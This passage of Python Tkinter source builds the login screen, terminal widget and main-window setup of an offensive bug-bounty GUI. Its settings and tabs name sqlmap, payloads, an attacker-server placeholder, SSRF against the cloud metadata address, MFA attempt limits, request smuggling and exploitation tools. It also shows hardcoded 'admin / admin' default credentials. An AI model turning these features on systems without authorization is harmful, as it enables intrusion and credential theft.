                    self.log(f"[!] {label or cmd[0]} exit code: {p.returncode}", 'warn')
                    write_audit(f"COMMAND_FAILED | user={user} | label={label} | exit_code={p.returncode}")
                self.proc = None
            except FileNotFoundError:
                self.log(f"[✗] '{cmd[0]}' not found — run installer first!", 'err')
                write_audit(f"COMMAND_ERROR | user={user} | label={label} | error=tool_not_found")
            except Exception as ex:
                self.log(f"[✗] {ex}", 'err')
                write_audit(f"COMMAND_ERROR | user={user} | label={label} | error={str(ex)[:100]}")
        threading.Thread(target=_run, daemon=True).start()

    def stop(self):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            self.log("[!] Process terminated by user", 'warn')
        self._stop_dot.config(fg='#ff5f57')

    def _open_shell(self):
        """Launch interactive terminal — cross-platform (Windows/Linux/macOS)."""
        ok = launch_terminal()
        if ok:
            self.log("[✓] Terminal launched", 'ok')
        else:
            self.log("[!] Could not launch terminal — open manually", 'warn')

    def clear(self):
        self.txt.config(state='normal')
        self.txt.delete('1.0', 'end')
        self.txt.config(state='disabled')
        self._lines = 0
        self._line_lbl.config(text='0 lines')

    def save_log(self):
        path = filedialog.asksaveasfilename(
            defaultextension='.txt',
            filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if path:
            with open(path, 'w') as f: f.write(self.txt.get('1.0', 'end'))
            self.log(f"[✓] Saved to {path}", 'ok')

    def _copy_selected(self):
        try:
            sel = self.txt.get(tk.SEL_FIRST, tk.SEL_LAST)
            self.txt.winfo_toplevel().clipboard_clear()
            self.txt.winfo_toplevel().clipboard_append(sel)
        except tk.TclError:
            pass  # nothing selected

    def _copy_all(self):
        content = self.txt.get('1.0', 'end')
        self.txt.winfo_toplevel().clipboard_clear()
        self.txt.winfo_toplevel().clipboard_append(content)

    def _toggle_search(self):
        if self._search_visible:
            self._search_bar.pack_forget()
            self._search_visible = False
        else:
            self._search_bar.pack(fill='x')
            self._search_visible = True

    def _search_term(self, term):
        self.txt.tag_remove('search_match', '1.0', 'end')
        if not term: self._match_lbl.config(text=''); return
        idx = '1.0'; count = 0
        while True:
            idx = self.txt.search(term, idx, nocase=True, stopindex='end')
            if not idx: break
            end = f"{idx}+{len(term)}c"
            self.txt.tag_add('search_match', idx, end)
            idx = end; count += 1
        self.txt.tag_config('search_match', background=YELLOW, foreground=BG)
        self._match_lbl.config(text=f"{count} match{'es' if count!=1 else ''}",
                                fg=GREEN if count else RED)


# ══════════════════════════════════════════════════════════════════════════════
#  LOGIN WINDOW
# ══════════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════════
#  ULTRA-PREMIUM LOGIN WINDOW
# ══════════════════════════════════════════════════════════════════════════════
class LoginWindow:
    def __init__(self):
        try:
            self.root = tk.Tk()
            self.root.title("TeamCyberOps Suite v4")
            self.root.configure(bg='#020408')
            self.root.resizable(False, False)
            self.user = None
            W, H = 560, 660
            try:
                sw = self.root.winfo_screenwidth()
                sh = self.root.winfo_screenheight()
            except Exception:
                sw, sh = 1920, 1080
            self.root.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
            self._anim_step = 0
            self._anim_job  = None
            self._build()
            self.root.mainloop()
        except Exception as e:
            if "no display" in str(e).lower() or "XError" in str(type(e).__name__):
                print("[!] ERROR: No display server")
                self.user = None
                raise SystemExit(1)
            raise

    def _build(self):
        root = self.root
        # ── Top accent strip ─────────────────────────────────────────────
        strip = tk.Frame(root, bg=BG, height=3)
        strip.pack(fill='x', side='top')
        for clr, w in [('#58a6ff',200),('#3fb950',120),('#bc8cff',80),('#f85149',50)]:
            tk.Frame(strip, bg=clr, width=w, height=3).pack(side='left')

        outer = tk.Frame(root, bg=BG); outer.pack(fill='both', expand=True)
        content = tk.Frame(outer, bg=BG)
        content.pack(fill='both', expand=True, padx=50, pady=20)

        # ── ASCII Logo ───────────────────────────────────────────────────
        logo_lines = [
            ("  ████████╗███████╗ █████╗ ███╗   ███╗", '#58a6ff'),
            ("     ██╔══╝██╔════╝██╔══██╗████╗ ████║", '#58a6ff'),
            ("     ██║   █████╗  ███████║██╔████╔██║", '#79c0ff'),
            ("     ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║", '#bc8cff'),
            ("     ██║   ███████╗██║  ██║██║ ╚═╝ ██║", '#bc8cff'),
            ("     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝", '#8b949e'),
        ]
        for line, clr in logo_lines:
            tk.Label(content, text=line, bg=BG, fg=clr,
                     font=(_MONO_FACE, 8)).pack()

        # ── Title ────────────────────────────────────────────────────────
        tf = tk.Frame(content, bg=BG); tf.pack(pady=(10, 2))
        tk.Label(tf, text="TeamCyberOps Suite", bg=BG, fg='#e6edf3',
                 font=(_MONO_FACE, 13, 'bold')).pack(side='left')
        tk.Label(tf, text="  v4.0", bg=BG, fg='#8b949e',
                 font=(_MONO_FACE, 9)).pack(side='left')

        # ── Tag pills ────────────────────────────────────────────────────
        pills = tk.Frame(content, bg=BG); pills.pack(pady=(0, 16))
        for tag, fg_c, bg_c in [
            ('Bug Bounty', '#58a6ff', '#0d2137'),
            ('Kali Linux', '#3fb950', '#0d2010'),
            ('AI Powered', '#bc8cff', '#1a0d2e'),
            ('v4.0',       '#d29922', '#2d1f00'),
        ]:
            tk.Label(pills, text=f' {tag} ', bg=bg_c, fg=fg_c,
                     font=(_MONO_FACE, 8, 'bold'),
                     relief='flat', padx=4, pady=2).pack(side='left', padx=3)

        # ── Login card ───────────────────────────────────────────────────
        card_border = tk.Frame(content, bg='#30363d', padx=1, pady=1)
        card_border.pack(fill='x')
        card = tk.Frame(card_border, bg='#161b22'); card.pack(fill='both')

        # Header
        hdr = tk.Frame(card, bg='#0d1117', height=40)
        hdr.pack(fill='x'); hdr.pack_propagate(False)
        tk.Label(hdr, text='🔐  Secure Access', bg='#0d1117', fg='#58a6ff',
                 font=(_MONO_FACE, 9, 'bold')).pack(side='left', padx=14)
        self._dot_lbl = tk.Label(hdr, text='● READY', bg='#0d1117', fg='#3fb950',
                                  font=(_MONO_FACE, 8))
        self._dot_lbl.pack(side='right', padx=14)
        tk.Frame(card, bg='#30363d', height=1).pack(fill='x')

        inner = tk.Frame(card, bg='#161b22')
        inner.pack(fill='x', padx=28, pady=24)

        # ── Fields ───────────────────────────────────────────────────────
        self._uv = tk.StringVar(value='admin')
        self._pv = tk.StringVar(value='')

        for label_txt, var, is_pass in [
            ('USERNAME', self._uv, False),
            ('PASSWORD', self._pv, True),
        ]:
            tk.Label(inner, text=label_txt, bg='#161b22', fg='#8b949e',
                     font=(_MONO_FACE, 8, 'bold'), anchor='w').pack(fill='x', pady=(0,4))

            wrap  = tk.Frame(inner, bg='#30363d', padx=1, pady=1)
            wrap.pack(fill='x', pady=(0, 14))
            field = tk.Frame(wrap, bg='#0d1117'); field.pack(fill='both')

            ico = '🔒' if is_pass else '👤'
            tk.Label(field, text=ico, bg='#0d1117', fg='#8b949e',
                     font=(_MONO_FACE, 10)).pack(side='left', padx=(10,0), pady=8)

            ent = tk.Entry(field, textvariable=var, bg='#0d1117', fg='#e6edf3',
                           insertbackground='#58a6ff', relief='flat', bd=0,
                           font=(_MONO_FACE, 11), selectbackground='#1f6feb',
                           selectforeground='#e6edf3')
            if is_pass:
                ent.config(show='●')
                ent.bind('<Return>', lambda e: self._do_login())
                self._show_pass = tk.BooleanVar(value=False)
                def _toggle(entry=ent, v=self._show_pass):
                    v.set(not v.get())
                    entry.config(show='' if v.get() else '●')
                tk.Button(field, text='👁', command=_toggle, bg='#0d1117', fg='#8b949e',
                          relief='flat', bd=0, cursor='hand2', activebackground='#21262d',
                          activeforeground='#e6edf3', padx=10).pack(side='right')
            ent.pack(side='left', fill='x', expand=True, ipady=7)

            def _fin(e, w=wrap):  w.config(bg='#58a6ff')
            def _fout(e, w=wrap): w.config(bg='#30363d')
            ent.bind('<FocusIn>',  _fin)
            ent.bind('<FocusOut>', _fout)

        # ── Status / button ──────────────────────────────────────────────
        self._status = tk.Label(inner, text='', bg='#161b22', fg='#f85149',
                                 font=(_MONO_FACE, 8))
        self._status.pack(pady=(0, 12))

        btn = tk.Button(inner, text='  ▶  ENTER FRAMEWORK  ', command=self._do_login,
                        bg='#238636', fg='#ffffff', relief='flat', bd=0,
                        font=(_MONO_FACE, 10, 'bold'), cursor='hand2',
                        activebackground='#2ea043', activeforeground='#ffffff',
                        padx=12, pady=11)
        btn.pack(fill='x')
        btn.bind('<Enter>', lambda e: btn.config(bg='#2ea043'))
        btn.bind('<Leave>', lambda e: btn.config(bg='#238636'))

        # Footer inside card
        tk.Frame(card, bg='#30363d', height=1).pack(fill='x')
        cf = tk.Frame(card, bg='#161b22'); cf.pack(fill='x', padx=28, pady=8)
        tk.Label(cf, text='Default: admin / admin', bg='#161b22', fg='#8b949e',
                 font=(_MONO_FACE, 8)).pack(side='left')
        tk.Label(cf, text='v4.0', bg='#161b22', fg='#484f58',
                 font=(_MONO_FACE, 8)).pack(side='right')

        # Footer
        ft = tk.Frame(content, bg=BG); ft.pack(fill='x', pady=(14, 0))
        tk.Label(ft, text='© 2026 TeamCyberOps  ·  Authorized Use Only',
                 bg=BG, fg='#484f58', font=(_MONO_FACE, 8)).pack(side='left')

        # Bottom strip
        bot = tk.Frame(root, bg=BG, height=3)
        bot.pack(fill='x', side='bottom')
        for clr, w in [('#f85149',50),('#3fb950',80),('#58a6ff',120),('#bc8cff',200)]:
            tk.Frame(bot, bg=clr, width=w, height=3).pack(side='right')

    def _do_login(self):
        u = self._uv.get().strip()
        p = self._pv.get().strip()
        if not u or not p:
            self._status.config(text="⚠  Enter username and password", fg='#d29922')
            return
        self._status.config(text="⏳  Authenticating...", fg='#58a6ff')
        self.root.update()
        user = auth.login(u, p)
        if user:
            write_audit(f"LOGIN | user={u} | role={user['role']}")
            self.user = user
            self._dot_lbl.config(text='● AUTHORIZED', fg='#3fb950')
            self.root.update()
            self.root.after(250, self.root.destroy)
        else:
            write_audit(f"FAILED LOGIN | user={u}")
            self._status.config(text="✗  Invalid credentials", fg='#f85149')
            self._pv.set("")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN APPLICATION
# ══════════════════════════════════════════════════════════════════════════════
class App:
    def __init__(self, user):
        self.user    = user
        self.root    = tk.Tk()
        self.project = tk.StringVar(value="")
        self.screenshot_path = ""
        # ── All StringVars ────────────────────────────────────────
        self.passive_target  = tk.StringVar()
        self.active_target   = tk.StringVar()
        self.nmap_flags      = tk.StringVar(value="-sV -sC -T4 --open")
        self.oh_ipfile       = tk.StringVar()
        self.oh_single_ip    = tk.StringVar()
        self.vuln_target     = tk.StringVar()
        self.nuclei_sev      = tk.StringVar(value="low,medium,high,critical")
        self.nuclei_rate     = tk.StringVar(value="20")
        self.sqlmap_data     = tk.StringVar()
        self.sqlmap_cookie   = tk.StringVar()
        self.sqlmap_level    = tk.StringVar(value="3")
        self.sqlmap_risk     = tk.StringVar(value="2")
        self.payload_cat     = tk.StringVar(value="XSS Basic")
        self.attacker_ip     = tk.StringVar(value="http://YOUR-SERVER")
        self.csp_input       = tk.StringVar()
        self.poc_title       = tk.StringVar()
        self.poc_url         = tk.StringVar()
        self.poc_type        = tk.StringVar()
        self.poc_sev         = tk.StringVar(value="HIGH")
        self.poc_cvss        = tk.StringVar()
        self.poc_vector      = tk.StringVar()
        self.findings_filter = tk.StringVar(value="All")
        self.report_author   = tk.StringVar(value=user.get('username','TeamCyberOps'))
        self.report_proj     = tk.StringVar()
        self.burp_host       = tk.StringVar(value="127.0.0.1")
        self.burp_port       = tk.StringVar(value="8080")
        self.proxy_host      = tk.StringVar(value="127.0.0.1")
        self.proxy_port      = tk.StringVar(value="8080")
        self.vpn_config      = tk.StringVar()
        self.url_target      = tk.StringVar()
        self.url_depth       = tk.StringVar(value="3")
        self.takeover_file   = tk.StringVar()
        self.scope_include   = tk.StringVar()
        self.scope_exclude   = tk.StringVar()
        self.notes_content   = tk.StringVar()
        self.tool_filter     = tk.StringVar(value="All")
        self.notify_vars     = {}
        self.api_vars        = {}
        self._ai_api_key     = tk.StringVar()
        # AI assistant vars (initialized here so methods can use safely)
        self._ai_provider        = tk.StringVar(value="claude")
        self._ai_input_var       = tk.StringVar()
        self._ai_txt_input       = None
        self._current_ai_feature = None
        self._ai_extra_vars      = {}
        self._ai_response_txt    = None
        self._ai_status_lbl      = None
        # Terminal refs (set when tabs are built)
        self.recon_term          = None
        self.vuln_term           = None
        self.url_term            = None
        # Smart recon vars
        self._sr_target          = tk.StringVar()
        self._aws_target         = tk.StringVar()
        self._aws_results_txt    = None
        self._sr_term            = None
        # Oneliners vars
        self._ol_target          = tk.StringVar()
        self._aws_target         = tk.StringVar()
        self._aws_results_txt    = None
        self._aws_paste_buf      = None
        # User management
        self._user_count_lbl     = None
        self.cvss_vars       = {}
        self._last_cvss      = None
        self.recon_term      = None
        self.vuln_term       = None
        self.url_term        = None
        self._findings_tree  = None
        self._results_tree   = None
        self._gql_url        = None
        self._gql_txt        = None
        self._csp_result     = None
        self._csp_bypass_txt = None
        self._report_log_txt = None
        self._pl_txt         = None
        self._pl_count_lbl   = None
        self._poc_desc       = None
        self._poc_steps      = None
        self._poc_impact     = None
        self._ss_lbl         = None
        self._url_results    = {}   # store parsed URL results
        self._user_tree      = None  # FIX: store tree ref for refresh
        self._scope_list     = []
        self._project_notes  = {}

        # ── v4 instance vars — init here so all methods safe ──────
        # Analysis
        self._js_results         = None
        self._cv_results         = None
        # HTTP Replayer
        self._http_history       = []
        self._http_history_btn_var = tk.StringVar(value="History: 0")
        # Auto-Recon pipeline
        self._ar_phase_vars      = []
        self._ar_phase_labels    = []
        self._ar_stat_labels     = []
        # Pipeline
        self._pipe_status_labels = []
        # Dork Runner
        self._runner_cat_cb      = None
        # Tech detection
        self._tech_vars          = {}
        # Template vars
        self._tmpl_vars          = {}
        # Wordlist data cache
        self._wl_data            = {}
        # SSRF / MFA / Smuggling
        self._ssrf_ep            = tk.StringVar()
        self._ssrf_param         = tk.StringVar(value="url")
        self._ssrf_oast          = tk.StringVar(value="your-vps.com")
        self._ssrf_blocked       = tk.StringVar(value="169.254.169.254")
        self._cloud_ep           = tk.StringVar()
        self._cloud_type         = tk.StringVar(value="AWS")
        self._cloud_role         = tk.StringVar(value="")
        self._portscan_ep        = tk.StringVar()
        self._portscan_host      = tk.StringVar(value="127.0.0.1")
        self._mfa_login_url      = tk.StringVar()
        self._mfa_verify_url     = tk.StringVar()
        self._mfa_username       = tk.StringVar()
        self._mfa_password       = tk.StringVar()
        self._mfa_cookie         = tk.StringVar()
        self._mfa_attempts       = tk.StringVar(value="15")
        self._mfa_valid_otp      = tk.StringVar()
        self._smug_host          = tk.StringVar()
        self._smug_port          = tk.StringVar(value="443")
        self._smug_path          = tk.StringVar(value="/")
        self._smug_tls           = tk.BooleanVar(value=True)
        self._smug_tpl           = tk.StringVar()
        # Dork runner
        self._runner_target      = tk.StringVar()
        self._runner_engine      = tk.StringVar(value="google")
        self._runner_cat         = tk.StringVar(value="ALL")
        self._runner_delay       = tk.StringVar(value="2")
        self._runner_use_proxy   = tk.BooleanVar(value=True)
        self._runner_only_200    = tk.BooleanVar(value=True)
        self._runner_stop        = tk.BooleanVar(value=False)
        self._runner_log         = None
        self._runner_progress_lbl= None
        self._dork_runner_results= []
        # Proxy manager
        self._proxies            = []
        self._proxy_test_url     = tk.StringVar(value="http://httpbin.org/ip")
        self._proxy_timeout      = tk.StringVar(value="8")
        self._proxy_threads      = tk.StringVar(value="30")
        self._proxy_http_var     = tk.BooleanVar(value=True)
        self._proxy_https_var    = tk.BooleanVar(value=True)
        self._proxy_socks4_var   = tk.BooleanVar(value=False)
        self._proxy_socks5_var   = tk.BooleanVar(value=False)
        # AI exploit
        self._mfa_log            = None
        # Tabs references (set in _build_ui)
        self._tabs_list          = []
        self._switch_tab         = lambda idx: None

        self.root.title(f"TeamCyberOps Suite v4  —  {user['username']}  [{user['role'].upper()}]")
        self.root.configure(bg=BG)
        self.root.minsize(1280, 720)
        try:
            self.root.state('zoomed')
        except Exception:
            try:
                self.root.attributes('-zoomed', True)
            except Exception:
                sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
                self.root.geometry(f"{sw}x{sh}+0+0")

        self._apply_style()
        self._build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        # Force Treeview colors after window is ready (Linux/WSL fix)
        self.root.after(100, self._force_treeview_colors)
        self.root.mainloop()

    # ── Style ─────────────────────────────────────────────────────
    def _apply_style(self):
        s = ttk.Style(); s.theme_use('clam')

        # ── Notebook ──────────────────────────────────────────────
        s.configure('TNotebook', background=BG2, borderwidth=0, tabmargins=[0, 4, 0, 0])
        s.configure('TNotebook.Tab', background=BG3, foreground=FG2,
                    font=(_MONO_FACE, 9), padding=[14, 8], borderwidth=0, relief='flat')
        s.map('TNotebook.Tab',
              background=[('selected', BG2), ('active', BG4)],
              foreground=[('selected', FG), ('active', FG)],
              expand=[('selected', [0, 0, 0, 0])])

        # ── Treeview — definitive dark theme fix ─────────────────
        # Use 'default' theme elements to override clam's broken fieldbackground
        s.configure('Treeview',
                    background=BG3,
                    foreground=FG,
                    fieldbackground=BG3,
                    borderwidth=0,
                    font=MONO_S,
                    rowheight=34,
                    relief='flat')
        s.configure('Treeview.Heading',
                    background=BG4,
                    foreground=ACCENT,
                    font=(_MONO_FACE, 9, 'bold'),
                    relief='flat',
                    borderwidth=0,
                    padding=[6, 6])
        # Custom row style to ensure visibility
        s.configure('Treeview.Row', background=BG3, foreground=FG)
        # NOTE: Do NOT use ('!selected', ...) in background map on Linux —
        # it overrides tag backgrounds. Only map 'selected' state.
        s.map('Treeview',
              background=[('selected', ACCENT),
                          ('!selected', BG3)],
              foreground=[('selected', '#000000'),
                          ('!selected', FG)])
        s.map('Treeview.Heading',
              background=[('active', BG5)],
              foreground=[('active', FG)])

        # ── Scrollbars ────────────────────────────────────────────
        for orient in ('Vertical', 'Horizontal'):
            s.configure(f'{orient}.TScrollbar', background=BG4, troughcolor=BG2,
                        arrowcolor=FG3, borderwidth=0, relief='flat', width=8)
            s.map(f'{orient}.TScrollbar',
                  background=[('active', ACCENT), ('pressed', ACCENT)])

        # ── Combobox ──────────────────────────────────────────────
        s.configure('TCombobox', background=BG3, foreground=FG, fieldbackground=BG3,
                    selectbackground=BG5, selectforeground=FG, font=MONO_S,
                    arrowcolor=FG2, borderwidth=1, relief='flat', padding=4)
        s.map('TCombobox',
              fieldbackground=[('readonly', BG3), ('focus', BG4)],
              selectbackground=[('readonly', BG3)],
              foreground=[('readonly', FG)],
              arrowcolor=[('disabled', FG3)])

        # ── Checkbutton / Radiobutton ─────────────────────────────
        s.configure('TCheckbutton', background=BG2, foreground=FG, font=MONO_S,
                    indicatorcolor=BG3, focuscolor=ACCENT)
        s.map('TCheckbutton',
              background=[('active', BG2)], foreground=[('active', FG)],
              indicatorcolor=[('selected', ACCENT), ('!selected', BG3)])
        s.configure('TRadiobutton', background=BG2, foreground=FG, font=MONO_S,
                    indicatorcolor=BG3, focuscolor=ACCENT)
        s.map('TRadiobutton',
              background=[('active', BG2)], foreground=[('active', FG)],
              indicatorcolor=[('selected', ACCENT), ('!selected', BG3)])

        # ── Progressbar ───────────────────────────────────────────
        s.configure('TProgressbar', background=ACCENT, troughcolor=BG3,
                    borderwidth=0, relief='flat', thickness=6)

        # ── Scale ─────────────────────────────────────────────────
        s.configure('TScale', background=BG2, troughcolor=BG4, sliderthickness=14)

        # ── PanedWindow / Sash ────────────────────────────────────
        s.configure('TPanedwindow', background=BG)
        s.configure('Sash', sashthickness=4, background=BG5, relief='flat')

        # ── Frame / Label / Separator ─────────────────────────────
        s.configure('TFrame', background=BG2)
        s.configure('TLabel', background=BG2, foreground=FG, font=MONO_S)
        s.configure('TSeparator', background=BORDER)

    def _force_treeview_colors(self):
        """Force TTK Treeview colors at Tcl level — fixes invisible rows on Linux/WSL."""
        try:
            self.root.tk.call('ttk::style', 'configure', 'Treeview',
                              '-background', BG3,
                              '-foreground', FG,
                              '-fieldbackground', BG3,
                              '-rowheight', '34')
            self.root.tk.call('ttk::style', 'map', 'Treeview',
                              '-foreground', ['selected', '#000000', '!selected', FG],
                              '-background', ['selected', ACCENT, '!selected', BG3])
        except Exception:
            pass


    # ── Layout ────────────────────────────────────────────────────
    def _build_ui(self):
        # ── GITHUB DARK TOP BAR ──────────────────────────────────────────
        topbar = tk.Frame(self.root, bg=BG2, height=58)
        topbar.pack(fill='x', side='top')
        topbar.pack_propagate(False)
        # Bottom border line
        tk.Frame(self.root, bg=BORDER, height=1).pack(fill='x', side='top')

        # Left: Logo
        logo_f = mk_frame(topbar, bg=BG2)
        logo_f.pack(side='left', padx=(14, 4), pady=0)
        # Hex icon
        hex_lbl = tk.Label(logo_f, text='⬡', bg=BG2, fg=ACCENT,
                           font=(_MONO_FACE, 16, 'bold'))
        hex_lbl.pack(side='left', padx=(0, 8), pady=12)
        # Title block
        title_f = mk_frame(logo_f, bg=BG2)
        title_f.pack(side='left')
        tk.Label(title_f, text='TeamCyberOps', bg=BG2, fg=FG,
                 font=(_MONO_FACE, 12, 'bold')).pack(anchor='w')
        tk.Label(title_f, text='Elite Bug Bounty Suite  v4.0',
                 bg=BG2, fg=FG3, font=(_MONO_FACE, 7)).pack(anchor='w')

        # Vertical separator
        tk.Frame(topbar, bg=BORDER, width=1).pack(
            side='left', fill='y', padx=14, pady=14)

        # Project selector block
        proj_f = mk_frame(topbar, bg=BG2)
        proj_f.pack(side='left', pady=0)
        tk.Label(proj_f, text='PROJECT', bg=BG2, fg=FG3,
                 font=(_MONO_FACE, 7, 'bold')).pack(anchor='w', padx=2)
        proj_row = mk_frame(proj_f, bg=BG2)
        proj_row.pack(fill='x')
        self.proj_combo = ttk.Combobox(
            proj_row, textvariable=self.project,
            values=self._proj_names(), width=22, font=MONO_S)
        self.proj_combo.pack(side='left', ipady=5)
        self.proj_combo.bind("<<ComboboxSelected>>",
                              lambda e: self._on_project_change())
        mk_btn(proj_row, "+ New", self._new_project,
               GREEN, small=True).pack(side='left', padx=(6, 0))

        # Right side controls
        tk.Frame(topbar, bg=BORDER, width=1).pack(
            side='right', fill='y', padx=10, pady=14)

        # User badge
        role_c = ACCENT if self.user.get('role') == 'admin' else GREEN
        user_f = mk_frame(topbar, bg=BG2)
        user_f.pack(side='right', padx=(0, 4))
        tk.Label(user_f, text='●', bg=BG2, fg=GREEN,
                 font=(_MONO_FACE, 8)).pack(side='left')
        tk.Label(user_f, text=f"  {self.user['username'].upper()}  ",
                 bg=BG2, fg=role_c,
                 font=(_MONO_FACE, 9, 'bold')).pack(side='left')

        tk.Frame(topbar, bg=BORDER, width=1).pack(
            side='right', fill='y', padx=4, pady=14)

        # Action buttons
        for ico, cmd, clr, tip in [
            ("⚙️ Settings", lambda: self._goto_tab("Settings"),         FG2,    "Open Settings"),
            ("🌗 Theme",    self._toggle_theme,           FG2,    "Toggle Light/Dark"),
            ("🔍 Search",   self._show_search,            FG2,    "Search all tabs"),
            ("🛠 Tools",    self._show_tool_installer,    YELLOW, "Install tools"),
            ("Logout",      self._logout,                 RED,    "Logout"),
        ]:
            b = mk_btn(topbar, ico, cmd, clr, small=True)
            b.pack(side='right', padx=2, pady=10)
            add_tooltip(b, tip)

        # ── GITHUB DARK STATUS BAR ────────────────────────────────────────
        statusbar = tk.Frame(self.root, bg=BG2, height=26)
        statusbar.pack(side='bottom', fill='x')
        statusbar.pack_propagate(False)
        tk.Frame(statusbar, bg=BORDER, height=1).pack(fill='x', side='top')
        self._status_var = tk.StringVar(value="  ✓  Ready")
        self._status_lbl = tk.Label(statusbar,
                                     textvariable=self._status_var,
                                     bg=BG2, fg=ACCENT,
                                     font=(_MONO_FACE, 8), anchor='w')
        self._status_lbl.pack(side='left', padx=10)
        # Right: python version + version
        tk.Label(statusbar,
                 text=f"Python {sys.version[:6]}  │  v4.0",
                 bg=BG2, fg=FG3, font=(_MONO_FACE, 8)).pack(side='right', padx=12)
        self._ip_lbl = tk.Label(statusbar, text="IP: —",
                                 bg=BG2, fg=FG3, font=(_MONO_FACE, 8))
        self._ip_lbl.pack(side='right', padx=8)
        # Fetch public IP
        def _fetch_ip():
            try:
                import urllib.request as _ur
                ip = _ur.urlopen('https://api.ipify.org', timeout=4).read().decode()
                self.root.after(0, lambda: self._ip_lbl.config(
                    text=f"IP: {ip}", fg=FG2))
            except Exception:
                pass
        threading.Thread(target=_fetch_ip, daemon=True).start()

        # ══════════════════════════════════════════════════════════
        # SIDEBAR + CONTENT LAYOUT  (replaces old Notebook)
        # ══════════════════════════════════════════════════════════
        main_area = tk.Frame(self.root, bg=BG)
        main_area.pack(fill='both', expand=True)

        # ── LEFT SIDEBAR ──────────────────────────────────────────
        sidebar_outer = tk.Frame(main_area, bg=BG6, width=196)
        sidebar_outer.pack(side='left', fill='y')
        sidebar_outer.pack_propagate(False)

        # Sidebar top accent line — GitHub blue
        tk.Frame(sidebar_outer, bg=ACCENT, height=2).pack(fill='x')

        # Search box inside sidebar
        search_frame = tk.Frame(sidebar_outer, bg=BG6)
        search_frame.pack(fill='x', padx=8, pady=(8,4))
        self._sb_search_var = tk.StringVar()
        sb_search = tk.Entry(search_frame, textvariable=self._sb_search_var,
                             bg=BG3, fg=FG, insertbackground=ACCENT,
                             relief='flat', font=(_MONO_FACE, 9),
                             highlightthickness=1,
                             highlightbackground=BORDER,
                             highlightcolor=ACCENT,
                             selectbackground='#1f6feb',
                             selectforeground=FG)
        sb_search.pack(fill='x', ipady=4)
        sb_search.bind('<FocusIn>',  lambda e: sb_search.config(highlightbackground=ACCENT, bg=BG4))
        sb_search.bind('<FocusOut>', lambda e: sb_search.config(highlightbackground=BORDER,  bg=BG3))
        tk.Label(search_frame, text="🔍 search tabs...", bg=BG6, fg=FG3,
                 font=(_MONO_FACE, 7)).pack(anchor='w')

        # Scrollable sidebar canvas
        sb_canvas = tk.Canvas(sidebar_outer, bg=BG6, highlightthickness=0, width=196)
        sb_vsb    = ttk.Scrollbar(sidebar_outer, orient='vertical', command=sb_canvas.yview)
        sb_canvas.configure(yscrollcommand=sb_vsb.set)
        sb_vsb.pack(side='right', fill='y')
        sb_canvas.pack(side='left', fill='both', expand=True)

        sb_inner = tk.Frame(sb_canvas, bg=BG6)
        sb_win   = sb_canvas.create_window((0, 0), window=sb_inner, anchor='nw')
        sb_inner.bind('<Configure>', lambda e: sb_canvas.configure(
            scrollregion=sb_canvas.bbox('all')))
        sb_canvas.bind('<Configure>', lambda e: sb_canvas.itemconfig(sb_win, width=e.width))

        # Cross-platform mouse wheel — sidebar
        def _sb_scroll(event):
            import platform as _plat
            _os = _plat.system()
            if _os == 'Windows':
                sb_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
            elif _os == 'Darwin':
                sb_canvas.yview_scroll(int(-1*event.delta), "units")
            else:
                if event.num == 4: sb_canvas.yview_scroll(-1, "units")
                elif event.num == 5: sb_canvas.yview_scroll(1, "units")

        sb_canvas.bind('<MouseWheel>', _sb_scroll)
        sb_canvas.bind('<Button-4>',   _sb_scroll)
        sb_canvas.bind('<Button-5>',   _sb_scroll)
        sb_inner.bind('<MouseWheel>',  _sb_scroll)
        sb_inner.bind('<Button-4>',    _sb_scroll)
        sb_inner.bind('<Button-5>',    _sb_scroll)

        # ── RIGHT CONTENT AREA ────────────────────────────────────
        content_area = tk.Frame(main_area, bg=BG)
        content_area.pack(side='left', fill='both', expand=True)

        # Fake nb object for backward-compatibility
        # Note: select() uses self._switch_tab which is set later in this method
        class FakeNB:
            def __init__(self2): self2._current = 0
            def select(self2, idx): self._switch_tab(idx)
            def index(self2, _): return self._current_tab_idx
            def tab(self2, t, key=None): return ""
            def tabs(self2): return list(range(len(self._tabs_list)))
            def bind(self2, *a, **k): pass
        self.nb = FakeNB()

        # ── TAB DEFINITIONS ───────────────────────────────────────
        TABS = [
            # (icon, short_name, category, builder)
            ("🏠", "Dashboard",      "MAIN",        self._build_dashboard),
            ("📁", "Projects",       "MAIN",        self._build_projects_tab),
            ("📡", "Live Dashboard", "MAIN",        self._build_live_dashboard_tab),
            ("🤖", "Auto-Recon",     "RECON",       self._build_auto_recon),
            ("🔍", "Recon",          "RECON",       self._build_recon),
            ("🧅", "Tor Recon",      "RECON",       self._build_tor_recon),
            ("🔬", "Deep Recon",     "RECON",       self._build_deep_recon_tab),
            ("🎯", "Smart Recon",    "RECON",       self._build_smart_recon),
            ("🕷", "URL Discovery",  "RECON",       self._build_url_discovery),
            ("🔎", "Dorks",          "RECON",       self._build_dorks),
            ("⚡", "Vuln Scanner",   "SCAN",        self._build_vuln),
            ("📝", "Nuclei Mgr",     "SCAN",        self._build_nuclei_mgr),
            ("🔬", "Analysis",       "SCAN",        self._build_analysis),
            ("🛡", "CVE Intel",      "SCAN",        self._build_cve_intel),
            ("💣", "Exploitation",   "EXPLOIT",     self._build_exploit),
            ("📦", "Payload Mgr",    "EXPLOIT",     self._build_payload_mgr),
            ("⚡", "Oneliners",      "EXPLOIT",     self._build_oneliners),
            ("🔗", "Chain Builder",  "EXPLOIT",     self._build_chain_builder),
            ("📡", "Deep Intel",     "EXPLOIT",     self._build_deep_intel),
            ("🚩", "Findings",       "RESULTS",     self._build_findings),
            ("📊", "Results",        "RESULTS",     self._build_results),
            ("📋", "Reports",        "RESULTS",     self._build_reports),
            ("📸", "Screenshots",    "RESULTS",     self._build_screenshot_tab),
            ("🕵", "OSINT",          "INTEL",       self._build_osint),
            ("📡", "HTTP Replayer",  "INTEL",       self._build_http_replayer),
            ("🔄", "Workflows",      "AUTO",        self._build_workflows),
            ("📡", "Monitor",        "AUTO",        self._build_monitor),
            ("🔒", "Auth Testing",   "ADVANCED",    self._build_auth_testing),
